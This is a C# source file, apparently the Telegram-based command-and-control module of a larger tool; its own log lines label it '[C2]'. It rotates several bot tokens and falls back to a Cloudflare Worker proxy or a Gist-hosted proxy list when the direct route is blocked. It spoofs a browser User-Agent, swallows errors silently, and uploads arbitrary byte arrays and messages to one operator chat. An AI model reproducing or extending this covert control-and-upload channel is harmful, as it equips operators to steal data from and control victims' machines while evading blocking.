using System;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using VanguardCore;
using System.Collections.Generic;
using System.Linq;
using Telegram.Bot.Types;

namespace FinalBot
{
    public static class TelegramService
    {
        private static ITelegramBotClient _botClient;
        private static string _adminId;
        private static HttpClient? _httpClient;
        
        private static string[] _allTokens = Array.Empty<string>();
        private static int _tokenIndex = 0;
        private static string _currentToken;

        private static string _currentRoute = "DIRECT";

        public static string? CurrentToken => _currentToken;

        public static void Initialize(string token, string adminId, HttpClient? client = null)
        {
            _adminId = adminId;
            _httpClient = client;
            
            var list = new List<string>();
            var t2 = SafetyManager.GetSecret("BOT_TOKEN_2");
            var t3 = SafetyManager.GetSecret("BOT_TOKEN_3");
            
            if (!string.IsNullOrEmpty(token)) list.Add(token.Trim());
            if (!string.IsNullOrEmpty(t2)) list.Add(t2.Trim());
            if (!string.IsNullOrEmpty(t3)) list.Add(t3.Trim());
            
            _allTokens = list.Distinct().ToArray();
            if (_allTokens.Length > 0) _currentToken = _allTokens[0];
            
            RecreateClient(client);
        }

        private static void RecreateClient(HttpClient? client)
        {
            var options = new TelegramBotClientOptions(_currentToken, GetBaseUrl());
            _botClient = new TelegramBotClient(options, client);
        }

        public static void RotateToken()
        {
            if (_allTokens.Length <= 1) return;
            _tokenIndex = (_tokenIndex + 1) % _allTokens.Length;
            _currentToken = _allTokens[_tokenIndex];
            RecreateClient(_httpClient);
            Console.WriteLine($"[C2] Token Rotated. New Token Index: {_tokenIndex} (Len: {_currentToken?.Length})");
        }

        public static async Task<bool> FindBestRoute()
        {

            // 1. Try Direct
            if (await TestConnection("https://api.telegram.org/"))
            {
                _currentRoute = "DIRECT";
                Console.WriteLine("[C2] Route: DIRECT");
                return true;
            }

            // 2. Try Worker Proxy
            var workerUrl = SafetyManager.GetSecret("CF_WORKER_URL")?.Trim();
            if (!string.IsNullOrEmpty(workerUrl))
            {
                if (await TestConnection(workerUrl))
                {
                    _currentRoute = "PROXY (Cloudflare)";
                    Console.WriteLine($"[C2] Route: {_currentRoute}");
                    return true;
                }
            }

            // 3. Try Gist Mesh
            var mesh = await GistManager.GetProxyMeshAsync();
            if (mesh != null && mesh.Count > 0)
            {
                // Simple mesh ping logic simplified for briefness
                _currentRoute = "DIRECT"; // Fallback to direct if mesh is just IPs
            }

            Console.WriteLine("[!] [C2] All routes failed or restricted. Attempting DIRECT fallback.");
            _currentRoute = "DIRECT";
            return false;
        }

        private static async Task<bool> TestConnection(string baseUrl)
        {
            try
            {
                if (!baseUrl.EndsWith("/")) baseUrl += "/";
                using var testClient = new HttpClient { Timeout = TimeSpan.FromSeconds(7) };
                testClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

                // Construct full URL: base + botTOKEN + /getMe
                var requestUrl = $"{baseUrl}bot{_currentToken}/getMe";
                var response = await testClient.GetAsync(requestUrl);

                if (response.IsSuccessStatusCode) return true;
                
                Console.WriteLine($"[C2] Probe ({baseUrl}) -> {(int)response.StatusCode} {response.ReasonPhrase}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[C2] Probe ({baseUrl}) -> Error: {ex.Message}");
            }
            return false;
        }

        public static string GetBaseUrl()
        {
            if (_currentRoute == "PROXY (Cloudflare)")
            {
                var workerUrl = SafetyManager.GetSecret("CF_WORKER_URL")?.Trim();
                if (!string.IsNullOrEmpty(workerUrl))
                {
                    if (!workerUrl.EndsWith("/")) workerUrl += "/";
                    return workerUrl;
                }
            }

            var baseUrl = SafetyManager.GetSecret("TG_API_BASE")?.Trim();
            if (string.IsNullOrEmpty(baseUrl) || !baseUrl.Contains("://")) baseUrl = "https://api.telegram.org/";
            
            if (baseUrl.EndsWith("/bot/")) baseUrl = baseUrl.Substring(0, baseUrl.Length - 5);
            else if (baseUrl.EndsWith("/bot")) baseUrl = baseUrl.Substring(0, baseUrl.Length - 4);

            if (!baseUrl.EndsWith("/")) baseUrl += "/";
            return baseUrl;
        }

        public static async Task SendMessage(string text, string? replyMarkup = null)
        {
            for (int i = 0; i < 2; i++)
            {
                try
                {
                    var baseUrl = GetBaseUrl();
                    var url = $"{baseUrl}bot{_currentToken}/sendMessage";
                    
                    var payload = new StringBuilder();
                    payload.Append("{");
                    payload.Append($"\"chat_id\":\"{_adminId}\",");
                    payload.Append($"\"text\":\"{JsonEscape(text)}\",");
                    payload.Append("\"parse_mode\":\"Html\"");
                    if (!string.IsNullOrEmpty(replyMarkup)) payload.Append($",\"reply_markup\":{replyMarkup}");
                    payload.Append("}");

                    using var content = new StringContent(payload.ToString(), Encoding.UTF8, "application/json");
                    var response = await new HttpClient().PostAsync(url, content);
                    if (response.IsSuccessStatusCode) return;
                }
                catch { await Task.Delay(1000); }
            }
        }

        public static async Task SendAnimation(string animationUrl, string? caption = null)
        {
            try
            {
                var baseUrl = GetBaseUrl();
                var url = $"{baseUrl}bot{_currentToken}/sendAnimation";
                var payload = $"{{\"chat_id\":\"{_adminId}\",\"animation\":\"{animationUrl}\",\"caption\":\"{JsonEscape(caption ?? "")}\",\"parse_mode\":\"Html\"}}";
                using var content = new StringContent(payload, Encoding.UTF8, "application/json");
                await new HttpClient().PostAsync(url, content);
            }
            catch { }
        }

        public static async Task SendDocument(byte[] data, string fileName, string? caption = null)
        {
            try
            {
                var baseUrl = GetBaseUrl();
                var url = $"{baseUrl}bot{_currentToken}/sendDocument";
                using var form = new MultipartFormDataContent();
                form.Add(new StringContent(_adminId), "chat_id");
                if (!string.IsNullOrEmpty(caption)) form.Add(new StringContent(caption), "caption");
                form.Add(new StringContent("Html"), "parse_mode");
                form.Add(new ByteArrayContent(data), "document", fileName);
                await new HttpClient().PostAsync(url, form);
            }
            catch { }
        }

        private static string JsonEscape(string text)
        {
            if (string.IsNullOrEmpty(text)) return "";
            return text.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "\\r").Replace("\t", "\\t");
        }
    }
}
